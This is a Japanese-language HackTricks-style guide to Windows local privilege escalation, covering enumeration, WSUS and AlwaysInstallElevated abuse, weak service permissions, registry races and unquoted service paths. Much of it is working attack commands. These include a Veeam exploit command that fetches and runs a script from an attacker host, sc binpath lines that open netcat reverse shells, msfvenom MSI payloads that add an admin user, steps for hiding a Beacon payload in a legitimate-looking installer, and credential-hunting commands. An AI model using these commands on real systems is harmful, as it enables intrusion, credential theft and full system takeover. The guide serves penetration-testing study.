# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows ローカル権限昇格ベクトルを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の初期理論

### Access Tokens

**Windows Access Tokens が何かわからない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows における Integrity Levels が何かわからない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**システムの列挙を妨げたり**、実行ファイルの実行を妨げたり、さらには**アクティビティを検知したり**する可能性のあるさまざまな要素があります。権限昇格の列挙を開始する前に、以下の**ページ**を**読み**、これらすべての**防御** **メカニズム**を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess のサイレント昇格

`RAiLaunchAdminProcess` を通じて起動された UIAccess プロセスは、AppInfo の secure-path チェックをバイパスすると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順については、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、**SMB arbitrary-port** LPE パスも導入されています。これは、特権を持つローカル NTLM 認証を、再利用された SMB TCP 接続を介してリフレクトするものです:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows のバージョンに既知の脆弱性があるか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows environment が持つ **massive attack surface** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables に credential/Juicy 情報が保存されていないか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) でこれを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、実行の詳細や出力結果が完全には記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択します。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell logs の最後の 15 件のイベントを表示するには、次を実行します。
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全内容の記録が取得され、実行時にすべてのコードブロックが記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジック調査や悪意のある動作の分析に役立ちます。実行時のすべてのアクティビティを記録することで、プロセスに関する詳細な情報が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のイベントログは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
最後の20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http ではなく http**S** を使用して要求されていない場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが非 SSL の WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では次のようにします：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合、

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらの脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのtoolsを使用できます。これらは、非SSLのWSUSトラフィックに`fake`なupdatesをinjectする、MiTM weaponized exploits scriptsです。

researchはこちらをご覧ください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なreportはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、これはこのbugがexploitするflawです：

> ローカルuserのproxyをmodifyでき、Windows UpdatesがInternet Explorerのsettingsで設定されたproxyを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自身のtrafficをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userのsettingsを使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateをgenerateし、そのcertificateをcurrent userのcertificate storeに追加すれば、HTTPおよびHTTPSのWSUS trafficをinterceptできます。WSUSは、certificateに対してtrust-on-first-use型のvalidationを実装するHSTSのようなmechanismを使用していません。提示されたcertificateがuserによってtrustedされ、正しいhostnameを持っていれば、serviceによってacceptedされます。

このvulnerabilityは、tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（liberatedされた後）を使用してexploitできます。

## Third-Party Auto-Updaters and Agent IPC（local privesc）

多くのenterprise agentsは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checksをtrustedする場合、local userはmalicious MSIをdeliverし、SYSTEM serviceにinstallさせることができます。Netskope stAgentSvc chain（CVE-2025-0309）を基にしたgeneralized techniqueはこちら：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401経由のSYSTEM）

Veeam B&R < `11.0.1.1261` は、**TCP/9401**上でlocalhost serviceを公開しており、attacker-controlled messagesをprocessすることで、**NT AUTHORITY\SYSTEM**としてarbitrary commandsを実行できます。

- **Recon**: listenerとversionを確認します。例：`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要なVeeam DLLsとともに、`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

特定の条件下にある Windows **domain** 環境では、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、ユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの **requirements** が **default settings** によって満たされる点です。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の flow の詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

**これら 2 つの registry が** **enabled**（値が **0x1**）の場合、任意の privilege を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（execute）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Meterpreter セッションがある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

Power-up の `Write-UserAddMSI` コマンドを使用すると、現在のディレクトリ内に権限を昇格するための Windows MSI バイナリを作成できます。このスクリプトは、ユーザーまたはグループの追加を促す precompiled MSI installer を書き出します（そのため、GIU access が必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**command lines** の**実行**だけが目的の場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使用して、**new Windows EXE TCP payload** を `C:\privesc\beacon.exe` に **Generate** します。
- **Visual Studio** を開き、**Create a new project** を選択して、search box に "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- project に **AlwaysPrivesc** などの名前を付け、location には **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（include する files の選択）に進むまで **Next** をクリックし続けます。**Add** をクリックし、先ほど Generate した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app がより legitimate に見えるように変更できる他の properties もあります。
- project を右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform が x64 に設定されていることを確認してください。

### MSI Installation

malicious な `.msi` file の**installation**を**background**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を exploit するには、以下を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検知器

### 監査設定

これらの設定によって何が**ログに記録される**かが決まるため、注意を払う必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding では、ログの送信先を知っておくことが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的としており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL によって十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）**に保存されます**。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority（LSA）に対する強化された保護機能を導入し、信頼されていないプロセスによる **メモリの読み取り** やコードの挿入を **ブロック** して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに、興味深い権限があるか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらで説明しています:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
**興味深いtoken**と、それらを悪用する方法については、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際には、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があり、[**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できる可能性がないか確認します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium デバッガー**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して権限昇格できる可能性があります。

**プロセスのバイナリに対する権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワードマイニング

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、メモリ内に**認証情報を平文で保持している**場合があります。メモリをダンプして認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で、"command prompt" を検索し、"Click to open Command Prompt" をクリックします

## Services

Service Triggers を使用すると、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP の利用可能状態、device arrival、GPO refresh など）が発生したときに Windows がサービスを起動できます。SERVICE_START rights がなくても、トリガーを発火させることで、privileged services を起動できることがよくあります。enumeration および activation techniques についてはこちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がサービスを変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

（たとえば SSDPSRV で）次のエラーが発生した場合：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドを使用して有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**（XP SP1 の場合）サービス upnphost は動作するために SSDPSRV に依存することに注意してください**

この問題に対する**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を所有しているシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス構成を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権ドメインアカウントとして実行されている一方で、**低権限ユーザーがサービス EXE またはその親フォルダーを変更できる場合**、**バイナリを置き換えてサービスを再起動することで**、サービスを乗っ取れることがあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**。**\
**wmic**（system32 にはありません）を使用して、サービスによって実行されるすべてのバイナリを取得し、**icacls** でアクセス許可を確認できます。
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
以下のように **sc** と **icacls** も使用できます：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注目してください。実際の悪用フローは次のとおりです。

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／service trigger を待ちます）。

Useful automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスによって通常のユーザーによる再起動が許可されていない場合は、起動時に自動的に開始されるか、失敗時のアクションによって再起動されるか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるか確認してください。\
以下を実行して、サービス **レジストリ** に対する **権限** を**確認**できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。これらのキーは、後に **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。Registry **symbolic link race** によって、この特権書き込みを **任意の HKLM パス**へリダイレクトでき、任意の HKLM **value write** primitive を取得できます。

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が列挙されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、logon/secure-desktop transitions 中に作成され、ユーザーによる書き込みが可能です。

悪用フロー（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい **HKCU ATConfig** の value を設定します。
2. secure-desktop copy を trigger します（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ち**ます。oplock が発生したら、**HKLM Session ATConfig** キーを、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選択した value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に pivot します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例: **`msiserver`**）を選び、書き込み後に trigger します。**注:** public exploit implementation は race の一部として **workstation を lock**します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

このレジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前で終わる各パスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次の実行を試みます：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除外して、引用符で囲まれていないすべてのサービス パスを一覧表示します。
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
